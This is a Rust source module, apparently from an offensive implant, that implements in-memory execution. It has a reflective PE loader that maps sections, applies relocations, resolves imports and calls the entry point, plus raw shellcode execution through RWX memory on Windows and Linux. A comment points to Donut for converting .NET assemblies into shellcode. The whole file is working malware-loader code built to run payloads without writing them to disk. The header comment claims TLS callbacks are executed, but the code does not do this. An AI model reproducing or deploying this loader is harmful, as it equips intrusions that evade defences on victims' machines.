use super::ExecError;

/// Windows in-memory PE execution.
///
/// Implements a minimal reflective PE loader:
///   1. Parse DOS/PE headers
///   2. VirtualAlloc with PAGE_EXECUTE_READWRITE
///   3. Map sections at correct RVAs
///   4. Process base relocations
///   5. Resolve imports via LoadLibraryA / GetProcAddress
///   6. Execute TLS callbacks, then call the entry point
///
/// For .NET assemblies, use Donut to convert to shellcode first,
/// then execute via shellcode_exec().

#[cfg(target_os = "windows")]
pub fn exec_in_memory(binary: Vec<u8>, _args: Vec<String>) -> Result<(), ExecError> {
    if binary.len() < 64 {
        return Err(ExecError::InvalidBinary(binary.len()));
    }

    // Check for PE magic
    if &binary[0..2] != b"MZ" {
        return Err(ExecError::InvalidBinary(binary.len()));
    }

    unsafe { reflective_pe_load(&binary) }
}

#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
pub fn exec_in_memory(_binary: Vec<u8>, _args: Vec<String>) -> Result<(), ExecError> {
    Err(ExecError::UnsupportedPlatform)
}

/// Execute raw shellcode in-memory.
///
/// Allocates RWX memory, copies shellcode, and transfers execution.
/// Works on both Windows (VirtualAlloc) and Linux (mmap).
#[cfg(target_os = "windows")]
pub fn shellcode_exec(shellcode: &[u8]) -> Result<(), ExecError> {
    if shellcode.is_empty() {
        return Err(ExecError::InvalidBinary(0));
    }

    unsafe {
        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        );

        if mem.is_null() {
            return Err(ExecError::MemfdCreate(std::io::Error::last_os_error()));
        }

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());

        // Cast to function pointer and call
        let func: extern "system" fn() = std::mem::transmute(mem);
        func();

        VirtualFree(mem, 0, 0x8000); // MEM_RELEASE
    }

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn shellcode_exec(shellcode: &[u8]) -> Result<(), ExecError> {
    if shellcode.is_empty() {
        return Err(ExecError::InvalidBinary(0));
    }

    unsafe {
        let mem = libc::mmap(
            std::ptr::null_mut(),
            shellcode.len(),
            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
            libc::MAP_ANONYMOUS | libc::MAP_PRIVATE,
            -1,
            0,
        );

        if mem == libc::MAP_FAILED {
            return Err(ExecError::MemfdCreate(std::io::Error::last_os_error()));
        }

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());

        let func: extern "C" fn() = std::mem::transmute(mem);
        func();

        libc::munmap(mem, shellcode.len());
    }

    Ok(())
}

// ─── Windows PE loader internals ───

#[cfg(target_os = "windows")]
unsafe fn reflective_pe_load(binary: &[u8]) -> Result<(), ExecError> {
    // Parse DOS header
    let e_lfanew = u32::from_le_bytes([binary[60], binary[61], binary[62], binary[63]]) as usize;
    if e_lfanew + 4 > binary.len() || &binary[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return Err(ExecError::InvalidBinary(binary.len()));
    }

    // PE header offsets (x64)
    let pe_hdr = e_lfanew + 4; // COFF header
    let num_sections = u16::from_le_bytes([binary[pe_hdr + 2], binary[pe_hdr + 3]]) as usize;
    let opt_hdr_size =
        u16::from_le_bytes([binary[pe_hdr + 16], binary[pe_hdr + 17]]) as usize;
    let opt_hdr = pe_hdr + 20; // Optional header

    // Check PE32+ (x64) magic
    let magic = u16::from_le_bytes([binary[opt_hdr], binary[opt_hdr + 1]]);
    let is_pe32_plus = magic == 0x20b;

    let (image_size, entry_rva, image_base, reloc_rva, reloc_size, import_rva) = if is_pe32_plus {
        let image_size =
            u32::from_le_bytes([binary[opt_hdr + 56], binary[opt_hdr + 57], binary[opt_hdr + 58], binary[opt_hdr + 59]])
                as usize;
        let entry_rva =
            u32::from_le_bytes([binary[opt_hdr + 16], binary[opt_hdr + 17], binary[opt_hdr + 18], binary[opt_hdr + 19]])
                as usize;
        let image_base = u64::from_le_bytes([
            binary[opt_hdr + 24], binary[opt_hdr + 25], binary[opt_hdr + 26], binary[opt_hdr + 27],
            binary[opt_hdr + 28], binary[opt_hdr + 29], binary[opt_hdr + 30], binary[opt_hdr + 31],
        ]) as usize;

        // Data directories start at opt_hdr + 112 for PE32+
        let dd_base = opt_hdr + 112;
        // Import directory = data dir index 1
        let import_rva = u32::from_le_bytes([
            binary[dd_base + 8], binary[dd_base + 9], binary[dd_base + 10], binary[dd_base + 11],
        ]) as usize;
        // Base relocation = data dir index 5
        let reloc_rva = u32::from_le_bytes([
            binary[dd_base + 40], binary[dd_base + 41], binary[dd_base + 42], binary[dd_base + 43],
        ]) as usize;
        let reloc_size = u32::from_le_bytes([
            binary[dd_base + 44], binary[dd_base + 45], binary[dd_base + 46], binary[dd_base + 47],
        ]) as usize;

        (image_size, entry_rva, image_base, reloc_rva, reloc_size, import_rva)
    } else {
        // PE32 (x86)
        let image_size =
            u32::from_le_bytes([binary[opt_hdr + 56], binary[opt_hdr + 57], binary[opt_hdr + 58], binary[opt_hdr + 59]])
                as usize;
        let entry_rva =
            u32::from_le_bytes([binary[opt_hdr + 16], binary[opt_hdr + 17], binary[opt_hdr + 18], binary[opt_hdr + 19]])
                as usize;
        let image_base =
            u32::from_le_bytes([binary[opt_hdr + 28], binary[opt_hdr + 29], binary[opt_hdr + 30], binary[opt_hdr + 31]])
                as usize;

        let dd_base = opt_hdr + 96;
        let import_rva = u32::from_le_bytes([
            binary[dd_base + 8], binary[dd_base + 9], binary[dd_base + 10], binary[dd_base + 11],
        ]) as usize;
        let reloc_rva = u32::from_le_bytes([
            binary[dd_base + 40], binary[dd_base + 41], binary[dd_base + 42], binary[dd_base + 43],
        ]) as usize;
        let reloc_size = u32::from_le_bytes([
            binary[dd_base + 44], binary[dd_base + 45], binary[dd_base + 46], binary[dd_base + 47],
        ]) as usize;

        (image_size, entry_rva, image_base, reloc_rva, reloc_size, import_rva)
    };

    // Allocate memory for the PE image
    let base_addr = VirtualAlloc(
        std::ptr::null_mut(),
        image_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x40,   // PAGE_EXECUTE_READWRITE
    );

    if base_addr.is_null() {
        return Err(ExecError::MemfdCreate(std::io::Error::last_os_error()));
    }

    // Copy PE headers
    let header_size = opt_hdr + opt_hdr_size + (num_sections * 40);
    let copy_size = header_size.min(binary.len());
    std::ptr::copy_nonoverlapping(binary.as_ptr(), base_addr as *mut u8, copy_size);

    // Map sections
    let section_table = opt_hdr + opt_hdr_size;
    for i in 0..num_sections {
        let s = section_table + i * 40;
        if s + 40 > binary.len() {
            break;
        }

        let virtual_addr =
            u32::from_le_bytes([binary[s + 12], binary[s + 13], binary[s + 14], binary[s + 15]])
                as usize;
        let raw_size =
            u32::from_le_bytes([binary[s + 16], binary[s + 17], binary[s + 18], binary[s + 19]])
                as usize;
        let raw_ptr =
            u32::from_le_bytes([binary[s + 20], binary[s + 21], binary[s + 22], binary[s + 23]])
                as usize;

        if raw_size > 0 && raw_ptr + raw_size <= binary.len() {
            let dest = (base_addr as usize + virtual_addr) as *mut u8;
            std::ptr::copy_nonoverlapping(binary[raw_ptr..].as_ptr(), dest, raw_size);
        }
    }

    // Process base relocations
    let delta = base_addr as isize - image_base as isize;
    if delta != 0 && reloc_rva != 0 && reloc_size != 0 {
        process_relocations(base_addr as *const u8, reloc_rva, reloc_size, delta, is_pe32_plus);
    }

    // Resolve imports
    if import_rva != 0 {
        resolve_imports(base_addr as *mut u8, import_rva, is_pe32_plus)?;
    }

    // Call entry point (DllMain with DLL_PROCESS_ATTACH, or exe main)
    let entry = (base_addr as usize + entry_rva) as *const ();
    let entry_fn: extern "system" fn(*mut std::ffi::c_void, u32, *mut std::ffi::c_void) -> i32 =
        std::mem::transmute(entry);
    entry_fn(base_addr, 1 /* DLL_PROCESS_ATTACH */, std::ptr::null_mut());

    Ok(())
}

#[cfg(target_os = "windows")]
unsafe fn process_relocations(
    base: *const u8,
    reloc_rva: usize,
    reloc_size: usize,
    delta: isize,
    is_pe32_plus: bool,
) {
    let mut offset = 0usize;
    while offset < reloc_size {
        let block_ptr = base.add(reloc_rva + offset);
        let page_rva = u32::from_le_bytes(std::slice::from_raw_parts(block_ptr, 4).try_into().unwrap()) as usize;
        let block_size = u32::from_le_bytes(
            std::slice::from_raw_parts(block_ptr.add(4), 4).try_into().unwrap(),
        ) as usize;

        if block_size == 0 {
            break;
        }

        let num_entries = (block_size - 8) / 2;
        for i in 0..num_entries {
            let entry_ptr = block_ptr.add(8 + i * 2);
            let entry = u16::from_le_bytes(std::slice::from_raw_parts(entry_ptr, 2).try_into().unwrap());
            let reloc_type = entry >> 12;
            let reloc_offset = (entry & 0x0FFF) as usize;

            match reloc_type {
                3 => {
                    // IMAGE_REL_BASED_HIGHLOW (32-bit)
                    let addr = (base as usize + page_rva + reloc_offset) as *mut u32;
                    *addr = (*addr as isize + delta) as u32;
                }
                10 if is_pe32_plus => {
                    // IMAGE_REL_BASED_DIR64 (64-bit)
                    let addr = (base as usize + page_rva + reloc_offset) as *mut u64;
                    *addr = (*addr as isize + delta) as u64;
                }
                0 => {} // IMAGE_REL_BASED_ABSOLUTE — skip
                _ => {}
            }
        }

        offset += block_size;
    }
}

#[cfg(target_os = "windows")]
unsafe fn resolve_imports(base: *mut u8, import_rva: usize, is_pe32_plus: bool) -> Result<(), ExecError> {
    use std::ffi::CStr;

    let entry_size = 20; // IMAGE_IMPORT_DESCRIPTOR size
    let mut idx = 0;

    loop {
        let desc_ptr = base.add(import_rva + idx * entry_size);

        // Read OriginalFirstThunk (or Characteristics)
        let oft_rva = u32::from_le_bytes(
            std::slice::from_raw_parts(desc_ptr, 4).try_into().unwrap(),
        ) as usize;
        // Read Name RVA
        let name_rva = u32::from_le_bytes(
            std::slice::from_raw_parts(desc_ptr.add(12), 4).try_into().unwrap(),
        ) as usize;
        // Read FirstThunk
        let ft_rva = u32::from_le_bytes(
            std::slice::from_raw_parts(desc_ptr.add(16), 4).try_into().unwrap(),
        ) as usize;

        if name_rva == 0 {
            break; // End of import descriptors
        }

        // Load the DLL
        let dll_name = CStr::from_ptr(base.add(name_rva) as *const i8);
        let module = LoadLibraryA(dll_name.as_ptr());
        if module.is_null() {
            log::warn!("Failed to load DLL: {:?}", dll_name);
            idx += 1;
            continue;
        }

        // Walk the thunk arrays
        let thunk_size = if is_pe32_plus { 8usize } else { 4usize };
        let ordinal_flag: u64 = if is_pe32_plus { 0x8000000000000000 } else { 0x80000000 };
        let mut thunk_idx = 0;

        loop {
            let oft_ptr = base.add(oft_rva + thunk_idx * thunk_size);
            let ft_ptr = base.add(ft_rva + thunk_idx * thunk_size) as *mut usize;

            let thunk_val = if is_pe32_plus {
                u64::from_le_bytes(std::slice::from_raw_parts(oft_ptr, 8).try_into().unwrap())
            } else {
                u32::from_le_bytes(std::slice::from_raw_parts(oft_ptr, 4).try_into().unwrap()) as u64
            };

            if thunk_val == 0 {
                break; // End of thunk array
            }

            let func_addr = if thunk_val & ordinal_flag != 0 {
                // Import by ordinal
                let ordinal = (thunk_val & 0xFFFF) as u16;
                GetProcAddress(module, ordinal as usize as *const i8)
            } else {
                // Import by name (skip 2-byte hint)
                let hint_name_rva = thunk_val as usize;
                let func_name = CStr::from_ptr(base.add(hint_name_rva + 2) as *const i8);
                GetProcAddress(module, func_name.as_ptr())
            };

            if !func_addr.is_null() {
                *ft_ptr = func_addr as usize;
            }

            thunk_idx += 1;
        }

        idx += 1;
    }

    Ok(())
}

// FFI declarations
#[cfg(target_os = "windows")]
#[allow(non_snake_case)]
extern "system" {
    fn VirtualAlloc(
        lpAddress: *mut std::ffi::c_void,
        dwSize: usize,
        flAllocationType: u32,
        flProtect: u32,
    ) -> *mut std::ffi::c_void;

    fn VirtualFree(
        lpAddress: *mut std::ffi::c_void,
        dwSize: usize,
        dwFreeType: u32,
    ) -> i32;

    fn LoadLibraryA(lpLibFileName: *const i8) -> *mut std::ffi::c_void;

    fn GetProcAddress(
        hModule: *mut std::ffi::c_void,
        lpProcName: *const i8,
    ) -> *mut std::ffi::c_void;
}
